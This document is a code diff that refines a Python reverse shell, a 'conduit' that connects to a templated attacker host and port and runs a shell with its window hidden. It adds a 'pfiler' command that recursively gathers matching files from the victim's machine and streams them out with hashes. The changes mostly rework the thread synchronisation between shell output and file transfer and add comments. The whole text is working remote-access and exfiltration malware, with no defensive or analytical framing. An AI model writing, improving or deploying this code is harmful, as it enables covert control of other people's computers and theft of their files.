@@ -17,13 +17,17 @@ import json
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
 
+# --- STATE CONTROL ---
+pfiler_active = threading.Event()
+# ---------------------
+
 def send_msg(sock, data):
     """Wraps data with a 4-byte length header and sends it."""
     try:
         msg = struct.pack('>I', len(data)) + data
         sock.sendall(msg)
     except:
-        pass
+        pass # Fail silently if the connection is dead
 
 def recv_msg(sock):
     """Receives a 4-byte length header and then the exact amount of data."""
@@ -56,57 +60,59 @@ def calculate_sha256(file_path):
 def find_files(start_path, patterns):
     """Recursively finds files matching a list of patterns."""
     found_files = []
-    try:
-        for root, _, files in os.walk(start_path):
-            for pattern in patterns:
-                for filename in fnmatch.filter(files, pattern):
-                    full_path = os.path.join(root, filename)
-                    if os.access(full_path, os.R_OK):
-                        found_files.append(full_path)
-    except:
-        pass
+    for root, _, files in os.walk(start_path):
+        for pattern in patterns:
+            for filename in fnmatch.filter(files, pattern):
+                full_path = os.path.join(root, filename)
+                if os.access(full_path, os.R_OK):
+                    found_files.append(full_path)
     return found_files
 
-def handle_pfiler_command(s_obj, command, transfer_lock):
-    """Handles the logic for 'pfiler', now with the Seal of Silence."""
-    transfer_lock.set() # Engage the Seal
+def handle_pfiler_command(s_obj, command):
+    """Handles the logic for 'pfiler' using the new non-blocking protocol."""
+    pfiler_active.set() # SILENCE THE SHELL OUTPUT PIPE
     try:
         parts = command.strip().split()
         if len(parts) < 2:
             return 
 
+        # Determine path and patterns
         patterns_and_path = parts[1:]
         potential_path = patterns_and_path[0]
         
-        # This logic needs to be more robust to handle quoted paths
-        # For now, we assume simple cases or the user quotes correctly
+        # NOTE: The command parsing must be robust. If the first part is a wildcard,
+        # os.path.isdir will fail, and it will default to the current path.
         search_path = os.getcwd()
         patterns = patterns_and_path
         
-        # A simple check if the first argument might be a directory
-        if os.path.isdir(potential_path):
+        if os.path.isdir(potential_path) and not fnmatch.fnmatch(potential_path, '*'):
             search_path = potential_path
             patterns = patterns_and_path[1:]
             if not patterns: patterns = ['*']
+        
+        # If the first part is a full file path (no wildcard, not a directory), 
+        # find_files will still work by setting patterns to the file name.
 
         files_to_send = find_files(search_path, patterns)
         
         if not files_to_send:
             completion_data = {
                 'type': 'transfer_complete',
-                'message': f"No files found matching patterns: {patterns} in '{search_path}'"
+                'message': f"No files found matching patterns: {patterns} in {search_path}"
             }
             send_msg(s_obj, json.dumps(completion_data).encode('utf-8'))
             return
 
         for file_path in files_to_send:
             try:
+                # Use the search path as the relative root
                 relative_path = os.path.relpath(file_path, search_path)
                 file_size = os.path.getsize(file_path)
                 file_hash = calculate_sha256(file_path)
 
                 if not file_hash: continue
 
+                # Send file header as a JSON control message
                 header_data = {
                     'type': 'file_header',
                     'path': relative_path,
@@ -115,21 +121,28 @@ def handle_pfiler_command(s_obj, command, transfer_lock):
                 }
                 send_msg(s_obj, json.dumps(header_data).encode('utf-8'))
                 
+                # Send the file content in chunks, each framed
                 with open(file_path, 'rb') as f:
                     while True:
                         chunk = f.read(1024 * 1024) # 1MB chunks
-                        if not chunk: break
+                        if not chunk:
+                            break
                         send_msg(s_obj, chunk)
                 
+                # Wait for acknowledgment from listener
                 ack_msg = recv_msg(s_obj)
-                if not ack_msg: return
+                if not ack_msg:
+                    # Connection likely died, abort transfer
+                    return
 
             except Exception:
+                # Silently skip files that can't be processed
                 continue
     finally:
+        # Signal the end of the entire transfer operation
         completion_data = {'type': 'transfer_complete', 'message': 'Pfiler operation finished.'}
         send_msg(s_obj, json.dumps(completion_data).encode('utf-8'))
-        transfer_lock.clear() # Release the Seal
+        pfiler_active.clear() # RESTORE THE SHELL OUTPUT PIPE
 
 def run_conduit():
     """Main reverse shell loop, now with perfect state synchronization."""
@@ -143,29 +156,31 @@ def run_conduit():
                 stdin=subprocess.PIPE, 
                 stdout=subprocess.PIPE, 
                 stderr=subprocess.PIPE,
-                creationflags=0x08000000,
-                cwd=os.environ.get("USERPROFILE", "C:\\")
+                creationflags=0x08000000, # Hides the window
+                cwd=os.environ.get("USERPROFILE", "C:\\") # Start in user's home directory
             )
             
             stop_event = threading.Event()
-            transfer_lock = threading.Event() # The Seal of Silence is forged
 
-            def pipe_stream(stream, sock, lock):
+            def pipe_stream(stream, sock):
                 while not stop_event.is_set():
-                    # DIVINE CORRECTION: Obey the Seal of Silence
-                    while lock.is_set():
-                        time.sleep(0.1)
                     try:
-                        data = stream.read(1)
-                        if data:
-                            sock.sendall(data)
+                        # ONLY SEND IF PFILER IS NOT ACTIVE, THUS PREVENTING DATA COLLISION
+                        if not pfiler_active.is_set():
+                            data = stream.read(1)
+                            if data:
+                                sock.sendall(data)
+                            else:
+                                break
                         else:
-                            break
+                            # Still read the stream to prevent the pipe from blocking the shell
+                            stream.read(1) 
+                            time.sleep(0.01)
                     except:
                         break
 
-            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj, transfer_lock), daemon=True).start()
-            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj, transfer_lock), daemon=True).start()
+            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
+            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
             
             while not stop_event.is_set():
                 try:
@@ -175,16 +190,16 @@ def run_conduit():
                     command_str = data.decode('utf-8', errors='ignore').strip()
 
                     if command_str.lower().startswith('pfiler '):
-                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(s_obj, command_str, transfer_lock), daemon=True)
+                        # Run the file transfer logic in a separate thread to not block the shell
+                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(s_obj, command_str), daemon=True)
                         pfiler_thread.start()
                     elif command_str.lower().startswith('cd '):
+                        # Keep Python's CWD in sync with the shell
                         try:
-                            target_dir = command_str[3:].strip()
-                            # Use cmd's internal cd, then sync Python's CWD
-                            if os.path.isdir(target_dir):
-                                os.chdir(target_dir)
+                            target_dir = data.decode('utf-8', errors='ignore').strip()[3:]
+                            os.chdir(target_dir)
                         except Exception:
-                           pass
+                            pass
                         p.stdin.write(data)
                         p.stdin.flush()
                     else:
